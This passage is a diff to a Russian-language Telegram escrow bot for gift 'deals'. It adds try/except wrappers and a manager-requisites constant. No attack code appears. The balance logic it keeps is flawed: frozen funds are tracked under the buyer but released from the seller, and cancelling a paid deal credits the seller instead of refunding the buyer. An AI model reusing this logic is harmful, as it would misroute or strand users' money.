-async def change_currency(callback: types.CallbackQuery, state: FSMContext):
-    logging.info("✅ change_currency вызван")
-    await callback.answer()
-    user_id = callback.from_user.id
-    await state.set_state(CreateDealStates.currency)
-    text = get_text(user_id, 'create_currency')
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="RUB", callback_data="cur_RUB")],
-        [InlineKeyboardButton(text="UAH", callback_data="cur_UAH")],
-        [InlineKeyboardButton(text="KZT", callback_data="cur_KZT")],
-        [InlineKeyboardButton(text="BYN", callback_data="cur_BYN")],
-        [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
-        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
-    ])
-    try:
-        await callback.message.answer(text, parse_mode="HTML", reply_markup=keyboard)
     except Exception as e:
         logging.error(f"Ошибка в change_currency: {e}")
-        await callback.message.answer("Произошла ошибка. Попробуйте позже.")
+        try:
+            await callback.message.answer("Произошла ошибка. Попробуйте позже.")
+        except:
+            pass
 
 @dp.message(CreateDealStates.amount)
 async def process_amount(message: Message, state: FSMContext):
@@ -1164,11 +1252,14 @@ async def process_amount(message: Message, state: FSMContext):
 @dp.callback_query(lambda c: c.data == "show_gift_desc")
 async def show_gift_desc(callback: types.CallbackQuery, state: FSMContext):
     logging.info("✅ show_gift_desc вызван")
-    await callback.answer()
-    user_id = callback.from_user.id
-    data = await state.get_data()
-    description = data.get('description', 'Описание не указано')
-    await callback.message.answer(f"Подарок: {description}")
+    try:
+        await callback.answer()
+        user_id = callback.from_user.id
+        data = await state.get_data()
+        description = data.get('description', 'Описание не указано')
+        await callback.message.answer(f"Подарок: {description}")
+    except Exception as e:
+        logging.error(f"Ошибка в show_gift_desc: {e}")
 
 @dp.message(CreateDealStates.description)
 async def process_description(message: Message, state: FSMContext):
@@ -1219,7 +1310,7 @@ async def process_description(message: Message, state: FSMContext):
         'completed': False,
         'paid': False,
         'gift_sent': False,
-        'manager_requisites': "Реквизиты менеджера: @Iank (заглушка)"
+        'manager_requisites': MANAGER_REQUISITES
     }
     logging.info(f"✅ Сделка создана с кодом {code}, сохранена в global_deals")
     await state.clear()
@@ -1228,15 +1319,18 @@ async def process_description(message: Message, state: FSMContext):
 @dp.callback_query(lambda c: c.data == "show_gift_final")
 async def show_gift_final(callback: types.CallbackQuery, state: FSMContext):
     logging.info("✅ show_gift_final вызван")
-    await callback.answer()
-    user_id = callback.from_user.id
-    data = await state.get_data()
-    code = data.get('deal_code')
-    if not code or code not in global_deals:
-        await callback.answer("Сделка не найдена", show_alert=True)
-        return
-    deal = global_deals[code]
-    await callback.message.answer(f"Подарок: {deal['description']}")
+    try:
+        await callback.answer()
+        user_id = callback.from_user.id
+        data = await state.get_data()
+        code = data.get('deal_code')
+        if not code or code not in global_deals:
+            await callback.answer("Сделка не найдена", show_alert=True)
+            return
+        deal = global_deals[code]
+        await callback.message.answer(f"Подарок: {deal['description']}")
+    except Exception as e:
+        logging.error(f"Ошибка в show_gift_final: {e}")
 
 # ---------- Присоединение к сделке ----------
 async def join_deal(message: Message, user_id: int, code: str):
@@ -1267,7 +1361,7 @@ async def join_deal(message: Message, user_id: int, code: str):
             description=deal['description'],
             currency=deal['currency'],
             amount=deal['amount'],
-            manager_requisites=deal.get('manager_requisites', '—')
+            manager_requisites=deal.get('manager_requisites', MANAGER_REQUISITES)
         )
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="Оплатить с баланса", icon_custom_emoji_id=CUSTOM_EMOJI_WITHDRAW, callback_data=f"pay_{code}")],
@@ -1278,7 +1372,7 @@ async def join_deal(message: Message, user_id: int, code: str):
     else:  # seller
         text = get_text(user_id, 'deal_created_seller').format(
             code=code,
-            manager_requisites=deal.get('manager_requisites', '—'),
+            manager_requisites=deal.get('manager_requisites', MANAGER_REQUISITES),
             seller_deals=get_user_completed_deals(user_id),
             balance=get_user_balance(user_id),
             currency=deal['currency']
@@ -1295,144 +1389,167 @@ async def join_deal(message: Message, user_id: int, code: str):
 # ---------- Действия со сделкой ----------
 @dp.callback_query(lambda c: c.data.startswith("gift_"))
 async def show_gift_deal(callback: types.CallbackQuery):
-    code = callback.data.split("_")[1]
-    if code not in global_deals:
-        await callback.answer("Сделка не найдена", show_alert=True)
-        return
-    deal = global_deals[code]
-    await callback.message.answer(f"Подарок: {deal['description']}")
-    await callback.answer()
+    try:
+        code = callback.data.split("_", 1)[1]
+        if code not in global_deals:
+            await callback.answer("Сделка не найдена", show_alert=True)
+            return
+        deal = global_deals[code]
+        await callback.message.answer(f"Подарок: {deal['description']}")
+        await callback.answer()
+    except Exception as e:
+        logging.error(f"Ошибка в show_gift_deal: {e}")
 
 @dp.callback_query(lambda c: c.data.startswith("pay_"))
 async def pay_from_balance(callback: types.CallbackQuery, state: FSMContext):
-    logging.info("✅ Обработчик pay_ (оплата с баланса) вызван, код: %s", callback.data.split("_")[1])
-    code = callback.data.split("_")[1]
-    if code not in global_deals:
-        await callback.answer("Сделка не найдена", show_alert=True)
-        return
-    user_id = callback.from_user.id
-    deal = global_deals[code]
-    amount = deal['amount']
-    balance = get_user_balance(user_id)
-    if balance < amount:
-        await callback.answer(f"Недостаточно средств на балансе. Доступно: {balance} {deal['currency']}", show_alert=True)
-        return
-    user_balance[user_id] = balance - amount
-    frozen_balance[user_id] = frozen_balance.get(user_id, 0.0) + amount
-    deal['paid'] = True
-    await callback.message.answer(f"Оплата {amount} {deal['currency']} прошла успешно. Средства заморожены до подтверждения сделки.")
-    seller_id = deal['seller']
-    if seller_id:
-        await bot.send_message(seller_id, f"Сделка #{code} оплачена покупателем. Ожидайте подтверждения.")
-    await state.clear()
-    await callback.answer()
-    log_action(user_id, "pay_deal", f"код {code}, сумма {amount}")
+    logging.info("✅ Обработчик pay_ (оплата с баланса) вызван")
+    try:
+        code = callback.data.split("_", 1)[1]
+        if code not in global_deals:
+            await callback.answer("Сделка не найдена", show_alert=True)
+            return
+        user_id = callback.from_user.id
+        deal = global_deals[code]
+        amount = deal['amount']
+        balance = get_user_balance(user_id)
+        if balance < amount:
+            await callback.answer(f"Недостаточно средств на балансе. Доступно: {balance} {deal['currency']}", show_alert=True)
+            return
+        user_balance[user_id] = balance - amount
+        frozen_balance[user_id] = frozen_balance.get(user_id, 0.0) + amount
+        deal['paid'] = True
+        await callback.message.answer(f"Оплата {amount} {deal['currency']} прошла успешно. Средства заморожены до подтверждения сделки.")
+        seller_id = deal['seller']
+        if seller_id:
+            await bot.send_message(seller_id, f"Сделка #{code} оплачена покупателем. Ожидайте подтверждения.")
+        await state.clear()
+        await callback.answer()
+        log_action(user_id, "pay_deal", f"код {code}, сумма {amount}")
+    except Exception as e:
+        logging.error(f"Ошибка в pay_from_balance: {e}")
+        try:
+            await callback.answer("Произошла ошибка при оплате.", show_alert=True)
+        except:
+            pass
 
 @dp.callback_query(lambda c: c.data.startswith("gift_sent_"))
 async def gift_sent(callback: types.CallbackQuery):
-    logging.info("✅ Обработчик gift_sent вызван, полный data: %s", callback.data)
-    code = callback.data.split("_")[2]
-    logging.info("✅ Извлечён код: %s", code)
-    if code not in global_deals:
-        logging.error("❌ Код %s не найден в global_deals", code)
-        await callback.answer("Сделка не найдена", show_alert=True)
-        return
-    user_id = callback.from_user.id
-    deal = global_deals[code]
-    if deal.get('gift_sent', False):
-        await callback.answer("Вы уже отправили подарок.", show_alert=True)
-        return
-    deal['gift_sent'] = True
-    buyer_id = deal['buyer']
-    seller_id = deal['seller']
-    if not buyer_id or not seller_id:
-        await callback.answer("Ошибка: не хватает участников.", show_alert=True)
-        return
-    buyer_username = "unknown"
-    seller_username = "unknown"
+    logging.info("✅ Обработчик gift_sent вызван")
     try:
-        buyer_user = await bot.get_chat(buyer_id)
-        buyer_username = buyer_user.username or str(buyer_id)
-    except:
-        pass
-    try:
-        seller_user = await bot.get_chat(seller_id)
-        seller_username = seller_user.username or str(seller_id)
-    except:
-        pass
+        code = callback.data.split("_", 2)[2]
+        logging.info(f"✅ Извлечён код: {code}")
+        if code not in global_deals:
+            logging.error(f"❌ Код {code} не найден в global_deals")
+            await callback.answer("Сделка не найдена", show_alert=True)
+            return
+        user_id = callback.from_user.id
+        deal = global_deals[code]
+        if deal.get('gift_sent', False):
+            await callback.answer("Вы уже отправили подарок.", show_alert=True)
+            return
+        deal['gift_sent'] = True
+        buyer_id = deal['buyer']
+        seller_id = deal['seller']
+        if not buyer_id or not seller_id:
+            await callback.answer("Ошибка: не хватает участников.", show_alert=True)
+            return
+        buyer_username = "unknown"
+        seller_username = "unknown"
+        try:
+            buyer_user = await bot.get_chat(buyer_id)
+            buyer_username = buyer_user.username or str(buyer_id)
+        except:
+            pass
+        try:
+            seller_user = await bot.get_chat(seller_id)
+            seller_username = seller_user.username or str(seller_id)
+        except:
+            pass
 
-    admin_text = get_text(ADMIN_ID, 'gift_sent_admin').format(
-        code=code,
-        buyer=buyer_username,
-        seller=seller_username,
-        amount=deal['amount'],
-        currency=deal['currency'],
-        description=deal['description']
-    )
-    admin_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Подтвердить передачу", callback_data=f"confirm_gift_{code}")],
-        [InlineKeyboardButton(text="Отправить сообщение продавцу", callback_data=f"reply_seller_{code}")]
-    ])
-    await bot.send_message(ADMIN_ID, admin_text, parse_mode="HTML", reply_markup=admin_keyboard)
-    await callback.message.answer(get_text(user_id, 'gift_sent_seller').format(code=code))
-    log_action(user_id, "gift_sent", f"код {code}")
-    await callback.answer()
+        admin_text = get_text(ADMIN_ID, 'gift_sent_admin').format(
+            code=code,
+            buyer=buyer_username,
+            seller=seller_username,
+            amount=deal['amount'],
+            currency=deal['currency'],
+            description=deal['description']
+        )
+        admin_keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Подтвердить передачу", callback_data=f"confirm_gift_{code}")],
+            [InlineKeyboardButton(text="Отправить сообщение продавцу", callback_data=f"reply_seller_{code}")]
+        ])
+        await bot.send_message(ADMIN_ID, admin_text, parse_mode="HTML", reply_markup=admin_keyboard)
+        await callback.message.answer(get_text(user_id, 'gift_sent_seller').format(code=code))
+        log_action(user_id, "gift_sent", f"код {code}")
+        await callback.answer()
+    except Exception as e:
+        logging.error(f"Ошибка в gift_sent: {e}")
+        try:
+            await callback.answer("Произошла ошибка при отправке подарка.", show_alert=True)
+        except:
+            pass
 
 @dp.callback_query(lambda c: c.data.startswith("confirm_gift_"))
 async def confirm_gift(callback: types.CallbackQuery):
-    code = callback.data.split("_")[2]
-    user_id = callback.from_user.id
-    if not is_admin(user_id):
-        await callback.answer("Нет доступа", show_alert=True)
-        return
-    if code not in global_deals:
-        await callback.answer("Сделка не найдена", show_alert=True)
-        return
-    deal = global_deals[code]
-    if deal.get('completed', False):
-        await callback.answer("Сделка уже завершена", show_alert=True)
-        return
-    seller_id = deal['seller']
-    amount = deal['amount']
-    if seller_id:
-        frozen_balance[seller_id] = frozen_balance.get(seller_id, 0.0) - amount
-        if frozen_balance[seller_id] < 0:
-            frozen_balance[seller_id] = 0.0
-        user_balance[seller_id] = user_balance.get(seller_id, 0.0) + amount
-        user_completed_deals[seller_id] = user_completed_deals.get(seller_id, 0) + 1
-    buyer_id = deal['buyer']
-    if buyer_id:
-        user_completed_deals[buyer_id] = user_completed_deals.get(buyer_id, 0) + 1
-    deal['status'] = 'completed'
-    deal['completed'] = True
-    final_text = get_text(ADMIN_ID, 'gift_confirm_admin').format(code=code)
-    await callback.message.answer(final_text, parse_mode="HTML")
-    if buyer_id:
-        await bot.send_message(buyer_id, get_text(buyer_id, 'gift_confirm_buyer').format(code=code))
-    if seller_id:
-        await bot.send_message(seller_id, get_text(seller_id, 'deal_completed').format(code=code))
-    log_action(user_id, "confirm_gift", f"код {code}")
-    await callback.answer()
+    try:
+        code = callback.data.split("_", 2)[2]
+        user_id = callback.from_user.id
+        if not is_admin(user_id):
+            await callback.answer("Нет доступа", show_alert=True)
+            return
+        if code not in global_deals:
+            await callback.answer("Сделка не найдена", show_alert=True)
+            return
+        deal = global_deals[code]
+        if deal.get('completed', False):
+            await callback.answer("Сделка уже завершена", show_alert=True)
+            return
+        seller_id = deal['seller']
+        amount = deal['amount']
+        if seller_id:
+            frozen_balance[seller_id] = frozen_balance.get(seller_id, 0.0) - amount
+            if frozen_balance[seller_id] < 0:
+                frozen_balance[seller_id] = 0.0
+            user_balance[seller_id] = user_balance.get(seller_id, 0.0) + amount
+            user_completed_deals[seller_id] = user_completed_deals.get(seller_id, 0) + 1
+        buyer_id = deal['buyer']
+        if buyer_id:
+            user_completed_deals[buyer_id] = user_completed_deals.get(buyer_id, 0) + 1
+        deal['status'] = 'completed'
+        deal['completed'] = True
+        final_text = get_text(ADMIN_ID, 'gift_confirm_admin').format(code=code)
+        await callback.message.answer(final_text, parse_mode="HTML")
+        if buyer_id:
+            await bot.send_message(buyer_id, get_text(buyer_id, 'gift_confirm_buyer').format(code=code))
+        if seller_id:
+            await bot.send_message(seller_id, get_text(seller_id, 'deal_completed').format(code=code))
+        log_action(user_id, "confirm_gift", f"код {code}")
+        await callback.answer()
+    except Exception as e:
+        logging.error(f"Ошибка в confirm_gift: {e}")
 
 @dp.callback_query(lambda c: c.data.startswith("reply_seller_"))
 async def reply_seller(callback: types.CallbackQuery, state: FSMContext):
-    user_id = callback.from_user.id
-    if not is_admin(user_id):
-        await callback.answer("Нет доступа", show_alert=True)
-        return
-    code = callback.data.split("_")[2]
-    if code not in global_deals:
-        await callback.answer("Сделка не найдена", show_alert=True)
-        return
-    deal = global_deals[code]
-    seller_id = deal['seller']
-    if not seller_id:
-        await callback.answer("Продавец не найден", show_alert=True)
-        return
-    await state.update_data(deal_code=code, seller_id=seller_id)
-    await state.set_state(AdminReply.waiting_message)
-    await callback.message.answer("Введите сообщение для продавца (текст):")
-    await callback.answer()
+    try:
+        user_id = callback.from_user.id
+        if not is_admin(user_id):
+            await callback.answer("Нет доступа", show_alert=True)
+            return
+        code = callback.data.split("_", 2)[2]
+        if code not in global_deals:
+            await callback.answer("Сделка не найдена", show_alert=True)
+            return
+        deal = global_deals[code]
+        seller_id = deal['seller']
+        if not seller_id:
+            await callback.answer("Продавец не найден", show_alert=True)
+            return
+        await state.update_data(deal_code=code, seller_id=seller_id)
+        await state.set_state(AdminReply.waiting_message)
+        await callback.message.answer("Введите сообщение для продавца (текст):")
+        await callback.answer()
+    except Exception as e:
+        logging.error(f"Ошибка в reply_seller: {e}")
 
 @dp.message(AdminReply.waiting_message)
 async def process_admin_reply(message: Message, state: FSMContext):
@@ -1456,30 +1573,33 @@ async def process_admin_reply(message: Message, state: FSMContext):
 
 @dp.callback_query(lambda c: c.data.startswith("cancel_"))
 async def cancel_deal(callback: types.CallbackQuery):
-    code = callback.data.split("_")[1]
-    user_id = callback.from_user.id
-    if code not in global_deals:
-        await callback.answer("Сделка не найдена", show_alert=True)
-        return
-    deal = global_deals[code]
-    if deal['status'] == 'completed':
-        await callback.answer("Сделка уже завершена", show_alert=True)
-        return
-    deal['status'] = 'cancelled'
-    if deal.get('paid', False):
-        seller_id = deal['seller']
-        amount = deal['amount']
-        if seller_id:
-            frozen_balance[seller_id] = frozen_balance.get(seller_id, 0.0) - amount
-            if frozen_balance[seller_id] < 0:
-                frozen_balance[seller_id] = 0.0
-            user_balance[seller_id] = user_balance.get(seller_id, 0.0) + amount
-    await callback.message.answer(get_text(user_id, 'deal_cancelled'))
-    other_side = deal['buyer'] if deal['seller'] == user_id else deal['seller']
-    if other_side:
-        await bot.send_message(other_side, f"Сделка #{code} отменена другой стороной.")
-    log_action(user_id, "cancel_deal", f"код {code}")
-    await callback.answer()
+    try:
+        code = callback.data.split("_", 1)[1]
+        user_id = callback.from_user.id
+        if code not in global_deals:
+            await callback.answer("Сделка не найдена", show_alert=True)
+            return
+        deal = global_deals[code]
+        if deal['status'] == 'completed':
+            await callback.answer("Сделка уже завершена", show_alert=True)
+            return
+        deal['status'] = 'cancelled'
+        if deal.get('paid', False):
+            seller_id = deal['seller']
+            amount = deal['amount']
+            if seller_id:
+                frozen_balance[seller_id] = frozen_balance.get(seller_id, 0.0) - amount
+                if frozen_balance[seller_id] < 0:
+                    frozen_balance[seller_id] = 0.0
+                user_balance[seller_id] = user_balance.get(seller_id, 0.0) + amount
+        await callback.message.answer(get_text(user_id, 'deal_cancelled'))
+        other_side = deal['buyer'] if deal['seller'] == user_id else deal['seller']
+        if other_side:
+            await bot.send_message(other_side, f"Сделка #{code} отменена другой стороной.")
+        log_action(user_id, "cancel_deal", f"код {code}")
+        await callback.answer()
+    except Exception as e:
+        logging.error(f"Ошибка в cancel_deal: {e}")
 
 # ---------- Завершение сделки (админ) ----------
 @dp.message(Command("complete_deal"))
@@ -1528,15 +1648,18 @@ async def cmd_complete_deal(message: types.Message):
 # ---------- Вывод средств ----------
 @dp.callback_query(lambda c: c.data == "withdraw")
 async def cb_withdraw(callback: types.CallbackQuery, state: FSMContext):
-    user_id = callback.from_user.id
-    completed = get_user_completed_deals(user_id)
-    if completed < 2:
-        await callback.answer(get_text(user_id, 'withdraw_need'), show_alert=True)
-        return
-    await callback.message.answer(get_text(user_id, 'withdraw_form_requisites'))
-    await state.set_state(WithdrawForm.waiting_requisites)
-    await callback.answer()
-    log_action(user_id, "withdraw_start", "начало оформления вывода")
+    try:
+        user_id = callback.from_user.id
+        completed = get_user_completed_deals(user_id)
+        if completed < 2:
+            await callback.answer(get_text(user_id, 'withdraw_need'), show_alert=True)
+            return
+        await callback.message.answer(get_text(user_id, 'withdraw_form_requisites'))
+        await state.set_state(WithdrawForm.waiting_requisites)
+        await callback.answer()
+        log_action(user_id, "withdraw_start", "начало оформления вывода")
+    except Exception as e:
+        logging.error(f"Ошибка в withdraw: {e}")
 
 @dp.message(WithdrawForm.waiting_requisites)
 async def process_requisites(message: Message, state: FSMContext):
@@ -1574,14 +1697,17 @@ async def process_amount(message: Message, state: FSMContext):
 
 @dp.callback_query(lambda c: c.data == "transactions")
 async def cb_transactions(callback: types.CallbackQuery):
-    user_id = callback.from_user.id
-    text = f"<b>{get_text(user_id, 'transactions_btn')}</b>\n\n{get_text(user_id, 'transactions_empty')}"
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
-    ])
-    await send_with_banner(callback, text, keyboard)
-    await callback.answer()
-    log_action(user_id, "transactions", "просмотр транзакций")
+    try:
+        user_id = callback.from_user.id
+        text = f"<b>{get_text(user_id, 'transactions_btn')}</b>\n\n{get_text(user_id, 'transactions_empty')}"
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
+        ])
+        await send_with_banner(callback, text, keyboard)
+        await callback.answer()
+        log_action(user_id, "transactions", "просмотр транзакций")
+    except Exception as e:
+        logging.error(f"Ошибка в transactions: {e}")
 
 # ============================================================
 # АДМИН-КОМАНДЫ (полный набор)
